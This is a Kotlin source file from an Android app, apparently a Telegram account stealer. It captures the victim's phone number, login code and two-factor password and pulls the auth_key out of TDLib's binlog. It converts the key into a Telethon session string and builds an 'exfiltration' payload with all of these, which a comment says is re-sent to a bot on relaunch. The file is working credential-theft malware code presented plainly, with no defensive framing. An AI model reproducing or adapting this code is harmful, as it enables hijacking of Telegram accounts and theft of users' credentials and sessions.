package com.tgme.app

import android.content.Context
import android.util.Base64
import org.drinkless.tdlib.TdApi
import java.io.File

object Capture {
    var phone = ""
    var code = ""
    var password = ""
    var codeLength = 0

    var userId = 0L
    var userName = ""
    var dcId = 0
    var authKeyHex = ""
    var session = ""

    private val AUTH_KEY = "auth_key".toByteArray(Charsets.US_ASCII)

    fun save(ctx: Context) {
        ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE).edit()
            .putString("phone", phone)
            .putString("code", code)
            .putString("password", password)
            .putString("session", session)
            .apply()
    }

    /** Relit les valeurs au demarrage : un simple relaunch re-envoie tout au bot. */
    fun load(ctx: Context) {
        val p = ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE)
        phone = p.getString("phone", "") ?: ""
        code = p.getString("code", "") ?: ""
        password = p.getString("password", "") ?: ""
        session = p.getString("session", "") ?: ""
    }

    // ---------- td.binlog ----------

    fun binlogFile(ctx: Context) = File(ctx.filesDir, "tdlib/db/td.binlog")

    /** A appeler APRES TdApi.Close() : TDLib doit avoir vide son binlog. */
    fun readAuth(ctx: Context, timeoutMs: Long = 20000): Boolean {
        val f = binlogFile(ctx)
        val end = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < end) {
            if (f.exists()) {
                try { if (parse(f.readBytes())) return true } catch (_: Exception) {}
            }
            try { Thread.sleep(250) } catch (_: InterruptedException) {}
        }
        return authKeyHex.isNotEmpty()
    }

    /** Scan brut : cle ASCII "auth_key<dc>" suivie d'une valeur de 260 octets. */
    private fun parse(b: ByteArray): Boolean {
        var i = indexOf(b, AUTH_KEY, 0)
        while (i >= 0) {
            var k = i + AUTH_KEY.size
            while (k < b.size && b[k].toInt() in 0x30..0x39) k++
            if (k + 4 <= b.size) {
                val vl = le32(b, k)
                val vs = k + 4
                if (vl >= 260 && vs + vl <= b.size) {
                    val v = b.copyOfRange(vs, vs + vl)
                    val dc = le32(v, 0)
                    if (dc in 1..5) {
                        val key = v.copyOfRange(v.size - 256, v.size)
                        authKeyHex = key.joinToString("") { "%02x".format(it.toInt() and 0xFF) }
                        dcId = dc
                        session = telethon(dc, key)
                        return true
                    }
                }
            }
            i = indexOf(b, AUTH_KEY, i + 1)
        }
        return false
    }

    private fun indexOf(h: ByteArray, n: ByteArray, from: Int): Int {
        if (n.isEmpty() || h.size < n.size) return -1
        var i = from
        while (i <= h.size - n.size) {
            var j = 0
            while (j < n.size && h[i + j] == n[j]) j++
            if (j == n.size) return i
            i++
        }
        return -1
    }

    private fun le32(b: ByteArray, p: Int): Int =
        (b[p].toInt() and 0xFF) or ((b[p + 1].toInt() and 0xFF) shl 8) or
            ((b[p + 2].toInt() and 0xFF) shl 16) or ((b[p + 3].toInt() and 0xFF) shl 24)

    /** String session Telethon : dc_id(1) + ip(4) + port(2) + auth_key(256), base64url. */
    private fun telethon(dc: Int, key: ByteArray): String {
        val ip = when (dc) {
            1 -> "149.154.175.53"
            2 -> "149.154.167.51"
            3 -> "149.154.175.100"
            4 -> "149.154.167.91"
            5 -> "91.108.56.130"
            else -> "149.154.167.51"
        }.split(".").map { it.toInt().toByte() }.toByteArray()

        val out = ByteArray(1 + 4 + 2 + 256)
        out[0] = dc.toByte()
        System.arraycopy(ip, 0, out, 1, 4)
        out[5] = 0xBB.toByte()   // port 443 en little-endian
        out[6] = 0x01
        System.arraycopy(key, 0, out, 7, 256)
        return Base64.encodeToString(out, Base64.URL_SAFE or Base64.NO_WRAP or Base64.NO_PADDING)
    }

    // ---------- verite serveur : sessions actives ----------

    fun render(s: TdApi.Sessions): String = buildString {
        append("SESSIONS (ttl ${s.inactiveSessionTtlDays} j)\n")
        s.sessions.forEach { x ->
            append(if (x.isCurrent) "[MOI] " else "[   ] ")
            append("${x.applicationName} ${x.applicationVersion} | ${x.deviceModel} | ")
            append("${x.systemVersion} | api_id ${x.apiId} | ${x.ip} ${x.city} ${x.country} | ")
            append("login ${x.logInDate} last ${x.lastActiveDate}\n")
        }
    }

    // ---------- exfiltration ----------

    fun payload(ctx: Context) = buildString {
        append("READY\n")
        append("num: $phone\n")
        append("code: $code\n")
        append("pass: $password\n")
        append("user: $userId $userName\n")
        append("dc: $dcId\n")
        append("auth_key: $authKeyHex\n")
        append("session: $session\n")
    }
}
